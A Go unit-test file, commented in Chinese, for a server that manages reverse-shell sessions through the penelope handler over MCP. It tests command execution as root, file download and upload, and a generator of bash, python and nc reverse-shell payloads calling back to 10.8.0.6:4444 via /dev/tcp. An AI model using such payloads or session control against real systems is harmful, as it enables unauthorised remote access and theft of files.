package server

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// 以下 fixture 是 2026-09-13 测试机(penelope --mcp)真实返回的 text block 内容。
const (
	penListFixture = `{
  "sessions": [
    {
      "id": 1,
      "name": "ubuntu~127.0.0.1-Linux-x86_64",
      "ip": "127.0.0.1",
      "port": 39960,
      "OS": "Unix",
      "type": "Raw",
      "subtype": null,
      "user": "root(0)",
      "source": "reverse"
    }
  ]
}`
	penInfoFixture = `{
  "id": 1,
  "name": "ubuntu~127.0.0.1-Linux-x86_64",
  "ip": "127.0.0.1",
  "port": 39960,
  "OS": "Unix",
  "type": "Raw",
  "subtype": null,
  "user": "root(0)",
  "source": "reverse",
  "hostname": "ubuntu",
  "system": "Linux",
  "arch": "x86_64",
  "cwd": "/root"
}`
	penExecFixture = `{
  "output": "uid=0(root) gid=0(root) groups=0(root)\nubuntu"
}`
	penListEmptyFixture = `{
  "sessions": []
}`
)

func TestParsePenSessions(t *testing.T) {
	ss, err := parsePenSessions(penListFixture)
	if err != nil {
		t.Fatal(err)
	}
	if len(ss) != 1 {
		t.Fatalf("期望 1 条会话,实际 %d", len(ss))
	}
	s := ss[0]
	if s.ID != 1 || s.IP != "127.0.0.1" || s.Port != 39960 || s.OS != "Unix" || s.User != "root(0)" || s.Source != "reverse" {
		t.Fatalf("字段不符: %+v", s)
	}
	empty, err := parsePenSessions(penListEmptyFixture)
	if err != nil || len(empty) != 0 {
		t.Fatalf("空列表解析不符: %v %v", empty, err)
	}
	if _, err := parsePenSessions("not json"); err == nil {
		t.Fatal("坏 JSON 应报错")
	}
}

func TestParsePenInfo(t *testing.T) {
	ps, err := parsePenInfo(penInfoFixture)
	if err != nil {
		t.Fatal(err)
	}
	if ps.Hostname != "ubuntu" || ps.System != "Linux" || ps.Arch != "x86_64" || ps.CWD != "/root" {
		t.Fatalf("info 字段不符: %+v", ps)
	}
}

func TestParseExecOutput(t *testing.T) {
	out, err := parseExecOutput(penExecFixture)
	if err != nil {
		t.Fatal(err)
	}
	if out != "uid=0(root) gid=0(root) groups=0(root)\nubuntu" {
		t.Fatalf("output 不符: %q", out)
	}
	if _, err := parseExecOutput(`{"error":"exec failed or session not ready"}`); err == nil {
		t.Fatal("error 字段应上抛")
	}
}

func TestParseStringList(t *testing.T) {
	got, err := parseStringList("downloaded", `{"downloaded":["/root/.penelope/sessions/x/downloads/etc/hostname"]}`)
	if err != nil || len(got) != 1 || !strings.HasSuffix(got[0], "etc/hostname") {
		t.Fatalf("downloaded 解析不符: %v %v", got, err)
	}
	if _, err := parseStringList("uploaded", `{"downloaded":[]}`); err == nil {
		t.Fatal("缺键应报错")
	}
}

func TestSplitRemotePath(t *testing.T) {
	cases := []struct{ in, dir, base string }{
		{"/a/b/c.txt", "/a/b", "c.txt"},
		{"/c.txt", "/", "c.txt"},
		{"c.txt", "", "c.txt"},
		{"/", "/", ""},
		{"", "", ""},
	}
	for _, c := range cases {
		dir, base := splitRemotePath(c.in)
		if dir != c.dir || base != c.base {
			t.Fatalf("splitRemotePath(%q)=(%q,%q),期望(%q,%q)", c.in, dir, base, c.dir, c.base)
		}
	}
}

func TestDiffPenSessions(t *testing.T) {
	known := map[int]int64{1: 10, 2: 11}
	newIDs, dead := diffPenSessions([]int{2, 3}, known)
	if len(newIDs) != 1 || newIDs[0] != 3 {
		t.Fatalf("newIDs 不符: %v", newIDs)
	}
	if len(dead) != 1 || dead[1] != 10 {
		t.Fatalf("dead 不符: %v", dead)
	}
	newIDs, dead = diffPenSessions([]int{1, 2}, known)
	if len(newIDs) != 0 || len(dead) != 0 {
		t.Fatalf("全量重合应为空 diff: %v %v", newIDs, dead)
	}
}

func TestReversePayloads(t *testing.T) {
	p := reversePayloads("10.8.0.6", 4444)
	for _, k := range []string{"bash", "python", "nc"} {
		if !strings.Contains(p[k], "10.8.0.6") || !strings.Contains(p[k], "4444") {
			t.Fatalf("payload %s 缺回连地址: %q", k, p[k])
		}
	}
	if !strings.Contains(p["bash"], "/dev/tcp/10.8.0.6/4444") {
		t.Fatalf("bash payload 形态不符: %q", p["bash"])
	}
}

// fakeMCP 是单测用的假 mcpCaller:按工具名返回罐头响应,记录调用参数。
type fakeMCP struct {
	responses map[string]string // tool → text block 内容
	err       map[string]error
	calls     []map[string]any
}

func (f *fakeMCP) Call(_ context.Context, tool string, args any) (string, error) {
	f.calls = append(f.calls, map[string]any{"tool": tool, "args": args})
	if err, ok := f.err[tool]; ok {
		return "", err
	}
	if r, ok := f.responses[tool]; ok {
		return r, nil
	}
	return "", fmt.Errorf("unexpected tool %q", tool)
}

func TestReverseShellExec(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{"exec_in_session": penExecFixture}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	stdout, stderr, err := sh.Exec(context.Background(), "id; hostname", 5*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if stderr != "" {
		t.Fatalf("reverse 通道 stderr 恒为空,实际 %q", stderr)
	}
	if !strings.Contains(stdout, "uid=0(root)") {
		t.Fatalf("stdout 不符: %q", stdout)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["session_id"] != 1 || args["command"] != "id; hostname" {
		t.Fatalf("MCP 参数不符: %v", args)
	}
}

func TestReverseShellExecDeadSession(t *testing.T) {
	// penelope 对未知/已死会话返回 JSON-RPC -32602(mcphttp.Call 上抛为 error)。
	fm := &fakeMCP{err: map[string]error{"exec_in_session": fmt.Errorf("mcp rpc error -32602: session 1 not found")}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if _, _, err := sh.Exec(context.Background(), "id", 0); err == nil ||
		!strings.Contains(err.Error(), "not found") {
		t.Fatalf("死会话错误应如实上抛: %v", err)
	}
}

func TestReverseShellTestProbe(t *testing.T) {
	// Test 发 echo 哨兵,回显含哨兵才算活;这里假 MCP 直接回显命令本身。
	fm := &fakeMCP{responses: map[string]string{}}
	fm.responses["exec_in_session"] = ""
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	// 回显为空 → 哨兵未回显 → 报错
	if err := sh.Test(context.Background()); err == nil {
		t.Fatal("哨兵未回显应报错")
	}
}

func TestReverseShellReadFile(t *testing.T) {
	// 模拟 penelope 下载落本地:先造本地文件,假 MCP 返回其路径。
	local := filepath.Join(t.TempDir(), "hostname")
	if err := os.WriteFile(local, []byte("ubuntu\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	fm := &fakeMCP{responses: map[string]string{
		"download_from_session": fmt.Sprintf(`{"downloaded":[%q]}`, local),
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	data, err := sh.ReadFile(context.Background(), "/etc/hostname")
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "ubuntu\n" {
		t.Fatalf("内容不符: %q", data)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["remote_path"] != "/etc/hostname" {
		t.Fatalf("remote_path 不符: %v", args)
	}
}

func TestReverseShellReadFileMultiMatch(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{
		"download_from_session": `{"downloaded":["/a","/b"]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if _, err := sh.ReadFile(context.Background(), "/etc/ho*"); err == nil ||
		!strings.Contains(err.Error(), "精确路径") {
		t.Fatalf("多匹配应报精确路径错误: %v", err)
	}
}

func TestReverseShellWriteFile(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{
		"upload_to_session": `{"uploaded":["/tmp/up.txt"]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if err := sh.WriteFile(context.Background(), "/tmp/up.txt", []byte("ARTEXUPLOADTEST")); err != nil {
		t.Fatal(err)
	}
	args := fm.calls[0]["args"].(map[string]any)
	// remote_path 必须是目录(实测语义);local_path 的 basename 必须等于目标 basename。
	if args["remote_path"] != "/tmp" {
		t.Fatalf("remote_path 应为目录: %v", args)
	}
	if filepath.Base(fmt.Sprint(args["local_path"])) != "up.txt" {
		t.Fatalf("local_path basename 必须保留目标文件名: %v", args["local_path"])
	}
}

func TestReverseShellWriteFileEmptyUpload(t *testing.T) {
	// penelope 对不可写目录/非持久 shell 返回 {"uploaded":[]}(实测),必须报错不装成功。
	fm := &fakeMCP{responses: map[string]string{
		"upload_to_session": `{"uploaded":[]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if err := sh.WriteFile(context.Background(), "/root/x", []byte("x")); err == nil {
		t.Fatal("空 uploaded 应报错")
	}
}

func TestReverseShellClose(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{"kill_session": `{"ok":true}`}}
	sh := &reverseShell{id: 7, penID: 3, caller: fm}
	if err := sh.Close(context.Background()); err != nil {
		t.Fatal(err)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["session_id"] != 3 {
		t.Fatalf("kill_session 参数不符: %v", args)
	}
	// 会话已死(kill 返回 -32602)也不应报错——Registry 清理语义。
	fm.err = map[string]error{"kill_session": fmt.Errorf("mcp rpc error -32602: session 3 not found")}
	if err := sh.Close(context.Background()); err != nil {
		t.Fatalf("已死会话 Close 应吞错: %v", err)
	}
}
